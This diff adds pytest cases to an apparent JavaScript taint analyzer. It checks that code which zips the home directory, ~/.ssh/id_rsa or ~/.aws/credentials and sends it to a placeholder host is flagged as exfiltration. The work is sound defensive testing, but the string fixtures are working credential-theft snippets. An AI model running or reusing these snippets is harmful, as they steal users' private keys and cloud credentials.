@@ -629,3 +629,64 @@ class TestBounds:
         started = time.monotonic()
         assert JsFlow.flows(deep) == []
         assert time.monotonic() - started < 5
+
+
+class TestArchiveThenSend:
+    """An archive built over local files carries what a read of them gives (home_file/secret_file),
+    and is read where the archive is sent -- `.toBuffer()`/`.generateAsync()` carry the archive's
+    taint through the `zip` reference. A project dir or a local write stays quiet (review 98 P4)."""
+
+    SENT: ClassVar[dict[str, tuple[str, list[str]]]] = {
+        "AdmZip homedir -> https.request": (
+            'const AdmZip = require("adm-zip");\nconst os = require("os");\n'
+            "const zip = new AdmZip();\nzip.addLocalFolder(os.homedir());\n"
+            'require("https").request({ hostname: "h.invalid" }).end(zip.toBuffer());\n',
+            ["home_file"],
+        ),
+        "AdmZip .ssh file -> https.request": (
+            'const AdmZip = require("adm-zip");\nconst os = require("os");\nconst path = require("path");\n'
+            'const zip = new AdmZip();\nzip.addLocalFile(path.join(os.homedir(), ".ssh/id_rsa"));\n'
+            'require("https").request({ hostname: "h.invalid" }).end(zip.toBuffer());\n',
+            ["home_file", "secret_file"],
+        ),
+        "JSZip readFileSync(secret) -> fetch": (
+            'const JSZip = require("jszip");\nconst fs = require("fs");\n'
+            'const os = require("os");\nconst path = require("path");\n'
+            'const zip = new JSZip();\nzip.file("c", fs.readFileSync(path.join(os.homedir(), ".aws/credentials")));\n'
+            'async function go() {\n  const b = await zip.generateAsync({ type: "nodebuffer" });\n'
+            '  await fetch("https://h.invalid/u", { method: "POST", body: b });\n}\n',
+            ["home_file", "secret_file"],
+        ),
+        "archiver directory(home) -> fetch": (
+            'const archiver = require("archiver");\nconst os = require("os");\n'
+            'const a = archiver("zip");\na.directory(os.homedir(), false);\na.finalize();\n'
+            'fetch("https://h.invalid/u", { method: "POST", body: a });\n',
+            ["home_file"],
+        ),
+    }
+    QUIET: ClassVar[dict[str, str]] = {
+        "a project dir zipped and uploaded": (
+            'const AdmZip = require("adm-zip");\nconst zip = new AdmZip();\nzip.addLocalFolder("./dist");\n'
+            'require("https").request({ hostname: "h.invalid" }).end(zip.toBuffer());\n'
+        ),
+        "home zipped to local disk (not a send)": (
+            'const AdmZip = require("adm-zip");\nconst os = require("os");\n'
+            'const zip = new AdmZip();\nzip.addLocalFolder(os.homedir());\nzip.writeZip("/tmp/b.zip");\n'
+        ),
+        "an empty archive uploaded": (
+            'const JSZip = require("jszip");\nasync function go() {\n  const zip = new JSZip();\n'
+            '  const b = await zip.generateAsync({ type: "nodebuffer" });\n'
+            '  await fetch("https://h.invalid/u", { method: "POST", body: b });\n}\n'
+        ),
+    }
+
+    @pytest.mark.parametrize("name", sorted(SENT))
+    def test_an_archive_of_local_files_is_sent(self, name: str) -> None:
+        code, want = self.SENT[name]
+        pairs = [(s, k) for s, k, _ in FlowKit.flows(code)]
+        assert (sorted(want), "request") in pairs
+
+    @pytest.mark.parametrize("name", sorted(QUIET))
+    def test_a_benign_archive_is_quiet(self, name: str) -> None:
+        sensitive = {"home_file", "secret_file"}
+        assert not [f for f in FlowKit.flows(self.QUIET[name]) if sensitive & set(f[0])]
